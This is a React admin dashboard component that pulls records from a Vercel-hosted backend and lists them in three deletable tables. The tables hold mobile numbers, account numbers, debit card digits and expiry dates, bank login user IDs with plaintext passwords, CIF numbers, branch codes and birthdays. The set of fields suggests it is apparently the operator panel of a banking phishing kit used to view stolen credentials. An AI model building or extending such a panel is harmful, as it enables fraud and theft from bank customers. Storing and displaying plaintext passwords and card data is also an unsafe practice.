import React, { useEffect, useState } from 'react';

const AdminSide2 = () => {
  const [users, setUsers] = useState([]);
  const [bankDetails, setBankDetails] = useState([]);
  const [bankingLast, setBankingLast] = useState([]);

  useEffect(() => {
    const fetchUsers = async () => {
      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api');
      const data = await response.json();
      setUsers(data);
    };

    const fetchBankDetails = async () => {
      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis');
      const data = await response.json();
      setBankDetails(data);
    };

    const fetchBankingLast = async () => {
      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/get');
      const data = await response.json();
      setBankingLast(data);
    };

    fetchUsers();
    fetchBankDetails();
    fetchBankingLast();
  }, []);

  const deleteUser = async (id) => {
    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api/${id}`, {
      method: 'DELETE',
    });
    setUsers(users.filter(user => user._id !== id));
  };

  const deleteBankDetail = async (id) => {
    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis/${id}`, {
      method: 'DELETE',
    });
    setBankDetails(bankDetails.filter(bankDetail => bankDetail._id !== id)); // Use _id for filtering
  };

  const deleteBankingLast = async (id) => {
    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/${id}`, {
      method: 'DELETE',
    });
    setBankingLast(bankingLast.filter(lastDetail => lastDetail._id !== id));
  };

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-2xl font-bold mb-4">Admin Dashboard</h1>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">Users</h2>
        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
          <thead>
            <tr className="bg-gray-200">
              <th className="py-2 px-4">Mobile Number</th>
              <th className="py-2 px-4">Account Number</th>
              <th className="py-2 px-4">Debit Card Digits</th>
              <th className="py-2 px-4">Expiry Date</th>
              <th className="py-2 px-4">Actions</th>
            </tr>
          </thead>
          <tbody>
            {users.map((user) => (
              <tr key={user._id}>
                <td className="py-2 px-4">{user.mobileNumber}</td>
                <td className="py-2 px-4">{user.accountNumber}</td>
                <td className="py-2 px-4">{user.debitCardDigits}</td>
                <td className="py-2 px-4">{user.expiryDate}</td>
                <td className="py-2 px-4">
                  <button 
                    onClick={() => deleteUser(user._id)} 
                    className="text-red-600 hover:text-red-800"
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">Bank Details</h2>
        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
          <thead>
            <tr className="bg-gray-200">
              <th className="py-2 px-4">Bank Name</th>
              <th className="py-2 px-4">User ID</th>
              <th className="py-2 px-4">Password</th>
              <th className="py-2 px-4">Actions</th>
            </tr>
          </thead>
          <tbody>
            {bankDetails.map((bankDetail) => (
              <tr key={bankDetail._id}>
                <td className="py-2 px-4">{bankDetail.bankName}</td>
                <td className="py-2 px-4">{bankDetail.userID}</td>
                <td className="py-2 px-4">{bankDetail.password}</td>
                <td className="py-2 px-4">
                  <button 
                    onClick={() => deleteBankDetail(bankDetail._id)} 
                    className="text-red-600 hover:text-red-800"
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">Banking Last Details</h2>
        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
          <thead>
            <tr className="bg-gray-200">
              <th className="py-2 px-4">Account Number</th>
              <th className="py-2 px-4">CIF Number</th>
              <th className="py-2 px-4">Branch Code</th>
              <th className="py-2 px-4">Birthday</th>
              <th className="py-2 px-4">Actions</th>
            </tr>
          </thead>
          <tbody>
            {bankingLast.map((lastDetail) => (
              <tr key={lastDetail._id}>
                <td className="py-2 px-4">{lastDetail.accountNumber}</td>
                <td className="py-2 px-4">{lastDetail.cifNumber}</td>
                <td className="py-2 px-4">{lastDetail.branchCode}</td>
                <td className="py-2 px-4">{new Date(lastDetail.birthday).toLocaleDateString()}</td>
                <td className="py-2 px-4">
                  <button 
                    onClick={() => deleteBankingLast(lastDetail._id)} 
                    className="text-red-600 hover:text-red-800"
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </section>
    </div>
  );
};

export default AdminSide2;
